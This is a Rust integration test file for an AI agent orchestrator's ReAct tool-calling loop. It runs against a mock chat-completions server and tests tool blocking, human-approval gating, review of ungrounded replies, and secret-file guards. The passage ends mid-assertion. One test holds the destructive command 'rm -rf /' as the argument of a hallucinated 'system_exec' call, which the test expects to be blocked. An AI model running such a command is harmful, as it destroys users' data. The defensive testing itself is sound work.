//! Integration tests for the multi-round ReAct loop in `process_message()`.
//!
//! Uses a local axum mock server that mimics OpenAI-compatible `/v1/chat/completions`
//! and `/v1/embeddings` endpoints. The mock chat endpoint returns responses from a
//! pre-configured sequence, allowing tests to simulate multi-round tool calling.
//!
//! These tests exercise the full orchestrator pipeline: message context building,
//! LLM calls, tool execution, cross-round state, and limit enforcement.

mod common;

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use axum::extract::State;
use axum::routing::post;
use axum::{Json, Router};
use serde::Deserialize;
use serde_json::{Value, json};
use tokio::task::JoinHandle;

use aegis_runtime_core::embedding::EmbeddingClient;
use aegis_runtime_core::identity::AgentIdentity;
use aegis_runtime_core::memory::{MemoryHandle, Message};
use aegis_runtime_core::models::SkillCapability;
use aegis_runtime_core::orchestrator::{Orchestrator, set_fast_token_mode};
use aegis_runtime_core::settings::RuntimeSettings;

/// Pre-store an "Always" scope approval for a HITL-gated tool so the ToolGate
/// allows execution. Without this, tools like `update_setting` and `switch_model`
/// return NeedApproval and never reach the actual handler.
async fn pre_approve_tool(memory: &MemoryHandle, tool_name: &str) {
    let approvals = serde_json::json!([{
        "tool_name": tool_name,
        "scope": "Always",
        "approved_at": "2025-01-01T00:00:00Z",
        "approved_by": "did:test:admin"
    }]);
    memory
        .store_skill_state(
            "hitl",
            &format!("tool_approvals:{tool_name}"),
            &approvals.to_string(),
        )
        .await
        .expect("pre-approve tool");
}

// ── Mock server infrastructure ──────────────────────────────────────────────

/// Shared state for the mock server. Supports a sequence of chat responses
/// so each successive call returns the next response in the queue.
struct MockServerState {
    /// Queue of chat completion responses. Each `process_message` LLM call
    /// pops the next response. If the queue is exhausted, returns a default
    /// text-only reply.
    chat_responses: Mutex<Vec<String>>,
    /// How many times `/v1/chat/completions` was called.
    chat_call_count: AtomicUsize,
    /// Raw JSON bodies posted to `/v1/chat/completions`, in order.
    chat_requests: Mutex<Vec<String>>,
    /// How many times `/v1/embeddings` was called.
    embed_call_count: AtomicUsize,
}

impl MockServerState {
    fn new(responses: Vec<String>) -> Self {
        Self {
            chat_responses: Mutex::new(responses),
            chat_call_count: AtomicUsize::new(0),
            chat_requests: Mutex::new(Vec::new()),
            embed_call_count: AtomicUsize::new(0),
        }
    }
}

// ── Mock endpoint request types ──────────────────────────────────────────────

#[derive(Deserialize)]
struct MockEmbedRequest {
    input: String,
    #[allow(dead_code)]
    model: Option<String>,
    #[allow(dead_code)]
    dimensions: Option<u32>,
}

// ── Mock endpoint handlers ──────────────────────────────────────────────────

const EMBED_DIMS: usize = 256;

// ── Realistic OpenRouter response format ─────────────────────────────────────
// Based on captured real API responses from OpenRouter (March 2026).
// Includes provider-specific fields: reasoning_details, native_finish_reason,
// provider, refusal, reasoning, cost_details, prompt_tokens_details, etc.
// This ensures tests catch deserialization issues like the async-openai hang
// with Grok's reasoning_details field.

/// Build a realistic OpenRouter usage block.
fn mock_usage(prompt_tokens: u64, completion_tokens: u64) -> Value {
    json!({
        "prompt_tokens": prompt_tokens,
        "completion_tokens": completion_tokens,
        "total_tokens": prompt_tokens + completion_tokens,
        "cost": 0.00005,
        "is_byok": false,
        "prompt_tokens_details": {
            "cached_tokens": 0,
            "cache_write_tokens": 0,
            "audio_tokens": 0,
            "video_tokens": 0
        },
        "cost_details": {
            "upstream_inference_cost": 0.00005,
            "upstream_inference_prompt_cost": 0.00003,
            "upstream_inference_completions_cost": 0.00002
        },
        "completion_tokens_details": {
            "reasoning_tokens": 0,
            "image_tokens": 0,
            "audio_tokens": 0
        }
    })
}

/// Default fallback response when the queue is exhausted.
/// Uses realistic OpenRouter format (matches google/gemini response structure).
fn fallback_text_response() -> String {
    json!({
        "id": "gen-fallback-mock",
        "object": "chat.completion",
        "created": 1700000000_u64,
        "model": "mock-model",
        "provider": "Mock",
        "system_fingerprint": null,
        "choices": [{
            "index": 0,
            "logprobs": null,
            "finish_reason": "stop",
            "native_finish_reason": "STOP",
            "message": {
                "role": "assistant",
                "content": "(fallback — response queue exhausted)",
                "refusal": null,
                "reasoning": null,
                "reasoning_details": []
            }
        }],
        "usage": mock_usage(10, 5)
    })
    .to_string()
}

/// `POST /v1/chat/completions` — pops next response from queue.
async fn handle_chat(
    State(state): State<Arc<MockServerState>>,
    body: String,
) -> axum::response::Response {
    state.chat_call_count.fetch_add(1, Ordering::SeqCst);
    state.chat_requests.lock().unwrap().push(body);

    let body = {
        let mut queue = state.chat_responses.lock().unwrap();
        if queue.is_empty() {
            fallback_text_response()
        } else {
            queue.remove(0)
        }
    };

    axum::response::Response::builder()
        .status(200)
        .header("content-type", "application/json")
        .body(axum::body::Body::from(body))
        .unwrap()
}

/// `POST /v1/embeddings` — returns deterministic embedding.
async fn handle_embed(
    State(state): State<Arc<MockServerState>>,
    Json(req): Json<MockEmbedRequest>,
) -> axum::response::Response {
    state.embed_call_count.fetch_add(1, Ordering::SeqCst);

    let dims = req.dimensions.unwrap_or(EMBED_DIMS as u32) as usize;
    let embedding = deterministic_embedding(&req.input, dims);

    // Matches real OpenRouter embedding response format (OpenAI provider style)
    let body = json!({
        "object": "list",
        "data": [{"object": "embedding", "embedding": embedding, "index": 0}],
        "model": "mock-embed-model",
        "usage": {"prompt_tokens": 5, "total_tokens": 5, "cost": 0.00000004},
        "provider": "Mock",
        "id": "gen-emb-mock"
    });

    axum::response::Response::builder()
        .status(200)
        .header("content-type", "application/json")
        .body(axum::body::Body::from(body.to_string()))
        .unwrap()
}

/// Generate a deterministic embedding from text hash (same as learning_integration).
fn deterministic_embedding(text: &str, dims: usize) -> Vec<f32> {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    text.hash(&mut hasher);
    let seed = hasher.finish();
    (0..dims)
        .map(|i| {
            let v = ((seed
                .wrapping_mul(6364136223846793005)
                .wrapping_add(i as u64)) as f32)
                / u64::MAX as f32;
            v * 2.0 - 1.0
        })
        .collect()
}

// ── Test setup helpers ──────────────────────────────────────────────────────

async fn spawn_mock_server(state: Arc<MockServerState>) -> (SocketAddr, JoinHandle<()>) {
    let app = Router::new()
        .route("/v1/chat/completions", post(handle_chat))
        .route("/v1/embeddings", post(handle_embed))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();

    let handle = tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });

    (addr, handle)
}

fn compiled_skills_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("compiled_skills")
}

/// Build a minimal Orchestrator pointed at the mock server.
/// Loads a stable built-in Wasm skill for tool execution tests.
/// Enables fast token estimation (byte-length heuristic) to avoid tiktoken BPE overhead in debug builds.
fn build_orchestrator(
    addr: SocketAddr,
    memory: MemoryHandle,
    settings: Arc<RuntimeSettings>,
) -> Orchestrator {
    build_orchestrator_multi(addr, memory, settings, &["server_monitor"])
}

/// Build an Orchestrator with multiple Wasm skills loaded.
/// `skill_names` should match filenames in compiled_skills/ (without .wasm).
fn build_orchestrator_multi(
    addr: SocketAddr,
    memory: MemoryHandle,
    settings: Arc<RuntimeSettings>,
    skill_names: &[&str],
) -> Orchestrator {
    set_fast_token_mode(true);

    let api_base = format!("http://{}/v1", addr);
    let embedder =
        EmbeddingClient::new(&api_base, "mock-key", "mock-embed-model", EMBED_DIMS as u32);

    let sandbox = common::shared_sandbox();

    for name in skill_names {
        let original_path = compiled_skills_dir().join(format!("{name}.wasm"));
        // server_monitor is a private skill omitted from the OSS snapshot.
        // Routing tests use a shipped no-network Wasm body under that logical
        // name; actual distributed skills are checked separately.
        let wasm_path = if original_path.exists() {
            original_path
        } else if *name == "server_monitor" {
            compiled_skills_dir().join("test_no_net.wasm")
        } else {
            panic!("Wasm skill not found: {}", original_path.display());
        };
        let (domains, schema) = match *name {
            "server_monitor" => (vec![], json!({"type": "object"})),
            "test_no_net" => (
                vec![],
                json!({
                    "type": "object",
                    "properties": {
                        "text": {"type": "string"},
                        "priority": {"type": "string"}
                    },
                    "required": ["text"]
                }),
            ),
            _ => (
                vec![],
                json!({"type": "object", "properties": {}, "additionalProperties": true}),
            ),
        };
        let cap = SkillCapability {
            skill_name: name.to_string(),
            max_memory_mb: 4,
            allowed_domains: domains,
            allowed_fs_paths: vec![],
            cron_schedule: None,
            description: format!("Test skill: {name}"),
            payload_schema: schema,
            default_payload: None,
            skill_pattern: None,
            language: "rust".to_string(),
            is_read_only: false,
            supports_multi_account: false,
            timeout_secs: 60,
            max_fuel: 500_000_000,
            shadow_mode: false,
            menu_command: None,
            menu_description: None,
            component_model: false,
            limitations: vec![],
        };
        sandbox.load_skill(&wasm_path, cap).unwrap_or_else(|e| {
            panic!("failed to load {name}: {e}");
        });
    }

    let identity = Arc::new(AgentIdentity::generate());
    let sandbox = Arc::new(sandbox);

    let mut orch = Orchestrator::new(
        "mock-key",
        &api_base,
        "mock-model",
        sandbox,
        identity,
        memory,
        embedder,
        settings,
    );
    orch.set_system_prompt("You are a test assistant.");
    orch
}

// ── Response builders ───────────────────────────────────────────────────────

/// Build a chat completion response with only text content (no tool calls).
/// Matches real OpenRouter response format (Google/Gemini style).
fn text_response(content: &str) -> String {
    json!({
        "id": "gen-text-mock",
        "object": "chat.completion",
        "created": 1700000000_u64,
        "model": "mock-model",
        "provider": "Mock",
        "system_fingerprint": null,
        "choices": [{
            "index": 0,
            "logprobs": null,
            "finish_reason": "stop",
            "native_finish_reason": "STOP",
            "message": {
                "role": "assistant",
                "content": content,
                "refusal": null,
                "reasoning": null,
                "reasoning_details": []
            }
        }],
        "usage": mock_usage(10, 10)
    })
    .to_string()
}

/// Build a chat completion response with a single tool call.
/// Matches real OpenRouter response format (includes index, reasoning_details).
fn tool_call_response(call_id: &str, tool_name: &str, args: Value) -> String {
    json!({
        "id": "gen-tool-mock",
        "object": "chat.completion",
        "created": 1700000000_u64,
        "model": "mock-model",
        "provider": "Mock",
        "system_fingerprint": null,
        "choices": [{
            "index": 0,
            "logprobs": null,
            "finish_reason": "tool_calls",
            "native_finish_reason": "STOP",
            "message": {
                "role": "assistant",
                "content": null,
                "refusal": null,
                "reasoning": null,
                "tool_calls": [{
                    "type": "function",
                    "index": 0,
                    "id": call_id,
                    "function": {
                        "name": tool_name,
                        "arguments": args.to_string()
                    }
                }],
                "reasoning_details": []
            }
        }],
        "usage": mock_usage(10, 10)
    })
    .to_string()
}

/// Build a multi-tool call response (LLM returns multiple tool_calls at once).
/// Used for testing parallel tool execution, budget enforcement, and exfiltration
/// detection across multiple concurrent calls.
fn multi_tool_call_response(calls: Vec<(&str, &str, Value)>) -> String {
    let tool_calls: Vec<Value> = calls
        .into_iter()
        .enumerate()
        .map(|(i, (call_id, tool_name, args))| {
            json!({
                "type": "function",
                "index": i,
                "id": call_id,
                "function": {
                    "name": tool_name,
                    "arguments": args.to_string()
                }
            })
        })
        .collect();

    json!({
        "id": "gen-multi-tool-mock",
        "object": "chat.completion",
        "created": 1700000000_u64,
        "model": "mock-model",
        "provider": "Mock",
        "system_fingerprint": null,
        "choices": [{
            "index": 0,
            "logprobs": null,
            "finish_reason": "tool_calls",
            "native_finish_reason": "STOP",
            "message": {
                "role": "assistant",
                "content": null,
                "refusal": null,
                "reasoning": null,
                "tool_calls": tool_calls,
                "reasoning_details": []
            }
        }],
        "usage": mock_usage(10, 10)
    })
    .to_string()
}

// ── Tests ───────────────────────────────────────────────────────────────────

/// Direct text reply → 1 round, no tool calls.
/// The agent review fires (zero-tool reply) but the reply is grounded.
#[tokio::test]
async fn react_direct_reply_one_round() {
    let state = Arc::new(MockServerState::new(vec![
        text_response("Hello! How can I help you?"),
        // No agent review needed — reply ends with '?' → Layer 1 fast-pass
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "hi", None)
        .await
        .unwrap();

    assert_eq!(result.reply, "Hello! How can I help you?");
    assert_eq!(result.rounds_used, 1);
    assert!(result.tools_called.is_empty());
    assert!(result.tools_blocked.is_empty());
    // 1 LLM call: main only. Agent review fast-passes (reply ends with '?',
    // caught by Layer 1 of the review pipeline — no LLM review needed).
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 1);
}

/// LLM calls recall_memory pseudo-tool → 2 rounds (tool call + final text).
#[tokio::test]
async fn react_pseudo_tool_recall_memory() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls recall_memory
        tool_call_response("call_1", "recall_memory", json!({"layer": "l2"})),
        // Round 2: LLM sees results, responds with text
        text_response("You have no stored memories yet."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what do you remember about me?", None)
        .await
        .unwrap();

    assert_eq!(result.reply, "You have no stored memories yet.");
    assert_eq!(result.rounds_used, 2);
    assert_eq!(result.tools_called, vec!["recall_memory"]);
    // 2 LLM calls: 2 main rounds (review skipped for tool-backed replies)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// LLM calls a sandboxed Wasm body under the legacy server_monitor tool name.
#[tokio::test]
async fn react_wasm_skill_execution() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls server_monitor
        tool_call_response("call_1", "server_monitor", json!({})),
        // Round 2: LLM summarizes result
        text_response("Server metrics were checked."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "check server health", None)
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 2);
    assert_eq!(result.tools_called, vec!["server_monitor"]);
    // 2 LLM calls: 2 main rounds (review skipped for tool-backed replies)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Multi-round chained tool calls: recall_memory → recall_memory → text.
#[tokio::test]
async fn react_multi_round_chained_tools() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls recall_memory with query
        tool_call_response("call_1", "recall_memory", json!({"query": "server"})),
        // Round 2: LLM calls recall_memory again with different query
        tool_call_response("call_2", "recall_memory", json!({"query": "deployment"})),
        // Round 3: LLM synthesizes results
        text_response(
            "Based on my memory search, I found information about both your server and deployment setup.",
        ),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message(
            "did:test:user1",
            "what do you know about my server and deployment?",
            None,
        )
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 3);
    assert_eq!(result.tools_called, vec!["recall_memory", "recall_memory"]);
    // 3 LLM calls: 3 main rounds (review skipped for tool-backed replies)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 3);
}

/// MAX_ROUNDS enforcement: LLM keeps calling tools but is eventually bounded.
/// Uses 5 tool rounds + natural text exit to verify loop control works.
/// (Full MAX_ROUNDS=15 test omitted — takes too long in debug builds.)
#[tokio::test]
async fn react_max_rounds_forces_final_with_hint() {
    // Build 5 tool-call rounds + a natural text response on round 6
    let mut responses = Vec::new();
    for i in 1..=5 {
        responses.push(tool_call_response(
            &format!("call_{i}"),
            "recall_memory",
            json!({"query": format!("query {i}")}),
        ));
    }
    // Round 6: LLM returns text (natural exit before MAX_ROUNDS)
    responses.push(text_response(
        "I've searched through 5 rounds of queries. Let me summarize what I found so far. \
         If you need me to search further, please let me know.",
    ));

    let state = Arc::new(MockServerState::new(responses));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "do extensive memory search", None)
        .await
        .unwrap();

    // 5 tool rounds + 1 text round = 6 rounds (well under MAX_ROUNDS=15)
    assert_eq!(result.rounds_used, 6);
    assert_eq!(result.tools_called.len(), 5);
    // 6 LLM calls total (5 with tools + 1 text)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 6);
    assert!(result.reply.contains("summarize"));
}

/// Hallucinated tool is blocked but loop continues.
/// Review fires because tools_called is empty (blocked tools don't count).
#[tokio::test]
async fn react_hallucinated_tool_blocked() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls a non-existent tool
        tool_call_response("call_1", "system_exec", json!({"cmd": "rm -rf /"})),
        // Round 2: LLM recovers gracefully
        text_response("I apologize, I cannot execute system commands."),
        // No agent review — reply has no completion signal → Layer 2a fast-pass
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "run a command", None)
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 2);
    assert!(result.tools_blocked.contains(&"system_exec".to_string()));
    // 3 LLM calls: 2 main rounds + the refusal audit (da67b7b7, src/orchestrator/message_flow.rs):
    // a reply that tells the owner "I cannot ..." is re-checked against the
    // tool list before it is sent. Agent review still passes at Layer 2a
    // (reply has no completion signal — "I apologize" is not a past-tense action claim).
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 3);
}

/// update_setting pseudo-tool creates HITL approval proposal.
#[tokio::test]
async fn react_update_setting_pseudo_tool() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls update_setting
        tool_call_response(
            "call_1",
            "update_setting",
            json!({"key": "skill_news_digest", "value": false}),
        ),
        // HITL proposal created → budget_exceeded path → final LLM call (same round)
        text_response("I've submitted the change for your approval."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    pre_approve_tool(&memory, "update_setting").await;
    let settings = Arc::new(RuntimeSettings::new());
    // Register the skill toggle so update_setting can validate the key
    settings.register_skill("news_digest", "news digest", true);
    let orch = build_orchestrator(addr, memory, settings.clone());

    let result = orch
        .process_message("did:test:user1", "disable news digest", None)
        .await
        .unwrap();

    // HITL pseudo-tool returns Ok(false) → budget_exceeded → final call in same round
    assert_eq!(result.rounds_used, 1);
    assert_eq!(result.tools_called, vec!["update_setting"]);
    // Setting is NOT immediately applied — it's pending HITL approval
    assert_eq!(
        settings.get("skill_news_digest"),
        Some(serde_json::Value::Bool(true))
    );
}

/// L1 memory stores the final reply after a multi-round turn.
#[tokio::test]
async fn react_reply_stored_in_l1() {
    let state = Arc::new(MockServerState::new(vec![
        tool_call_response("call_1", "recall_memory", json!({})),
        text_response("Here is what I found in memory."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory.clone(), settings);

    let _result = orch
        .process_message("did:test:user1", "recall everything", None)
        .await
        .unwrap();

    // Check L1 has both user message and assistant reply
    let history = memory.get_l1("did:test:user1").await.unwrap();
    assert_eq!(history.len(), 2);
    assert_eq!(history[0].role, "user");
    assert_eq!(history[0].content, "recall everything");
    assert_eq!(history[1].role, "assistant");
    assert_eq!(history[1].content, "Here is what I found in memory.");
}

/// Embedding failure degrades gracefully — continues without L2 context.
#[tokio::test]
async fn react_embedding_failure_returns_early() {
    // Mock server: embedding will fail, but LLM should still be called
    let state = Arc::new(MockServerState::new(vec![
        text_response("Hello! How can I help you?"),
        // No agent review needed — reply ends with '?' → Layer 1 fast-pass
    ]));

    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());

    // Build orchestrator with a broken embedding endpoint
    let api_base = format!("http://{}/v1", addr);
    let broken_embedder = EmbeddingClient::new("http://127.0.0.1:1", "bad-key", "bad-model", 256);

    let sandbox = Arc::new(common::shared_sandbox());
    let identity = Arc::new(AgentIdentity::generate());

    let mut orch = Orchestrator::new(
        "mock-key",
        &api_base,
        "mock-model",
        sandbox,
        identity,
        memory,
        broken_embedder,
        settings,
    );
    orch.set_system_prompt("Test");

    let result = orch
        .process_message("did:test:user1", "hello", None)
        .await
        .unwrap();

    // Embedding failure degrades gracefully — LLM is still called.
    // Agent review fast-passes (reply ends with '?', Layer 1).
    assert_eq!(result.rounds_used, 1);
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 1);
}

/// Agent review: when review flags a zero-tool reply as ungrounded, returns corrected version.
///
/// NOTE: This test requires the LLM review layer (Layer 3) to fire, which only happens
/// when Layer 2b (semantic matching) flags a mismatch. With mock hash-based embeddings,
/// cosine similarity is effectively random and won't exceed the 0.6 threshold, so the
/// review pipeline fast-passes without reaching the LLM layer. Requires real embeddings.
#[tokio::test]
#[ignore = "requires real embeddings for semantic matching to trigger LLM review"]
async fn agent_review_flags_ungrounded_reply() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM responds with fabricated data (no tools called)
        text_response(
            "According to Hacker News, user pg posted: 'AI is the future' with 350 points.",
        ),
        // Agent review: flags as ungrounded, provides corrected reply
        text_response(
            r#"{"grounded": false, "reason": "contains specific HN quotes and scores without tool call", "corrected_reply": "I don't have access to live HN data. Would you like me to search for the latest posts?"}"#,
        ),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what's trending on HN?", None)
        .await
        .unwrap();

    // The corrected reply should be returned, not the fabricated one
    assert!(result.reply.contains("don't have access"));
    assert!(!result.reply.contains("350 points"));
    // 2 LLM calls: 1 main + 1 review (no re-run)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Agent review: skipped for tool-backed replies (structurally grounded).
#[tokio::test]
async fn agent_review_skipped_for_tool_backed_replies() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls recall_memory
        tool_call_response("call_1", "recall_memory", json!({"layer": "l2"})),
        // Round 2: LLM responds with text
        text_response("I found some relevant information in my memory."),
        // No review call — tool-backed replies are trusted
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what do you remember?", None)
        .await
        .unwrap();

    assert_eq!(
        result.reply,
        "I found some relevant information in my memory."
    );
    assert_eq!(result.tools_called, vec!["recall_memory"]);
    // 2 LLM calls: 2 main rounds only (no review)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Agent review: fail-open on error (returns original reply).
#[tokio::test]
async fn agent_review_fail_open_on_error() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM responds with text (no tools)
        text_response("Here is some general information about Rust."),
        // Review response runs out of mock responses — error triggers fail-open
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "tell me about Rust", None)
        .await
        .unwrap();

    // Original reply preserved (review error → fail-open)
    assert_eq!(result.reply, "Here is some general information about Rust.");
}

// ── New tests: XML retry, guard tool execution, structured errors ────────────

/// sanitize_xml retry: model emits XML on first try, proper text on retry after correction.
#[tokio::test]
async fn sanitize_xml_retry_recovers() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: Model emits raw XML tool calls (all content is in <tool_call> tags)
        text_response(
            "<tool_call>{\"name\":\"web_search\",\"args\":{\"query\":\"test\"}}</tool_call>",
        ),
        // Round 2 (after correction injection): Model responds with proper text
        text_response("Here are the search results for your query."),
        // No agent review — reply has no completion signal → Layer 2a fast-pass
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "search for test", None)
        .await
        .unwrap();

    assert_eq!(result.reply, "Here are the search results for your query.");
    // 2 LLM calls: 1 XML fail + 1 retry. Agent review passes at Layer 2a
    // (reply has no past-tense completion signal).
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// sanitize_xml retry max once: model emits XML twice → returns fallback (no infinite loop).
#[tokio::test]
async fn sanitize_xml_retry_max_once() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: Model emits raw XML
        text_response("<tool_call>{\"name\":\"web_search\"}</tool_call>"),
        // Round 2 (retry): Model emits XML again
        text_response("<tool_call>{\"name\":\"web_search\"}</tool_call>"),
        // No agent review — fallback message has no completion signal → Layer 2a fast-pass
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "search for test", None)
        .await
        .unwrap();

    // Should return the fallback message after exhausting the single retry
    assert!(result.reply.contains("attempted to use a tool"));
    // 2 LLM calls: 1 XML + 1 XML retry. Agent review passes at Layer 2a
    // (fallback message has no completion signal).
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Agent review: when flagged without corrected_reply, returns original (fail-open).
/// See `agent_review_flags_ungrounded_reply` for why mock embeddings prevent this test.
#[tokio::test]
#[ignore = "requires real embeddings for semantic matching to trigger LLM review"]
async fn agent_review_no_correction_returns_original() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM responds with fabricated data (no tools called)
        text_response("Bitcoin is currently at $45,000."),
        // Agent review: flags but no corrected_reply
        text_response(r#"{"grounded": false, "reason": "specific BTC price without tool call"}"#),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what's bitcoin price?", None)
        .await
        .unwrap();

    // No corrected_reply → fail-open, returns original
    assert!(result.reply.contains("$45,000"));
    // 2 LLM calls: 1 main + 1 review
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Wasm execution error returns structured JSON with error_kind and hint.
#[tokio::test]
async fn wasm_execution_error_returns_structured_json() {
    // We test this by calling a real Wasm tool with unusual args. The
    // orchestrator must return a usable reply even if the tool reports an error.
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls server_monitor
        tool_call_response("call_1", "server_monitor", json!({"unexpected": true})),
        // Round 2: LLM responds with text after seeing error
        text_response("The server monitor result was handled."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "check server health", None)
        .await
        .unwrap();

    // The orchestrator should have processed the error and returned a text reply
    assert!(!result.reply.is_empty());
    assert!(result.tools_called.contains(&"server_monitor".to_string()));
}

/// Telegram MarkdownV2 escape function works correctly.
#[test]
fn telegram_escape_markdown_v2() {
    use aegis_runtime_core::telegram::escape_markdown_v2;

    assert_eq!(escape_markdown_v2("hello"), "hello");
    assert_eq!(escape_markdown_v2("hello.world"), "hello\\.world");
    assert_eq!(escape_markdown_v2("*bold*"), "\\*bold\\*");
    assert_eq!(escape_markdown_v2("a_b_c"), "a\\_b\\_c");
    assert_eq!(escape_markdown_v2("(test)"), "\\(test\\)");
    assert_eq!(escape_markdown_v2("no special"), "no special");
}

// ── Live-test env harness guards ────────────────────────────────────────────
// `common::load_test_env` must be inert unless the process opted in with
// AEGIS_LIVE_TESTS=1, and even then may only read <repo root>/.env.test —
// never the production secrets under /opt/aegis-runtime. These guards pin the
// pure decision function so a regression (any fallback location, any
// implicit opt-in) fails here without touching the process environment.

/// Negative control: with the opt-in absent or set to anything but `1`, the
/// harness must resolve to NO file at all. (The pre-2026-09-16 harness fell
/// back to /opt/aegis-runtime/shared/.env here, which this assertion rejects.)
#[test]
fn live_env_file_is_none_without_explicit_opt_in() {
    for opt_in in [
        None,
        Some(""),
        Some("0"),
        Some("true"),
        Some("yes"),
        Some(" 1"),
    ] {
        assert_eq!(
            common::live_env_file(opt_in),
            None,
            "opt_in={opt_in:?} must not load any env file"
        );
    }
}

/// With `AEGIS_LIVE_TESTS=1` the only permitted source is `.env.test` at the
/// repo root — never a path under /opt/aegis-runtime.
#[test]
fn live_env_file_points_at_repo_root_env_test_when_opted_in() {
    let path = common::live_env_file(Some("1")).expect("opt-in must resolve a path");
    assert_eq!(path, common::repo_root().join(common::LIVE_ENV_FILE));
    assert_eq!(path.file_name().and_then(|n| n.to_str()), Some(".env.test"));
    assert!(
        path.parent()
            .is_some_and(|p| p.join("core").join("Cargo.toml").exists()),
        "parent must be the repo root, got {}",
        path.display()
    );
    assert!(
        !path.starts_with("/opt/aegis-runtime"),
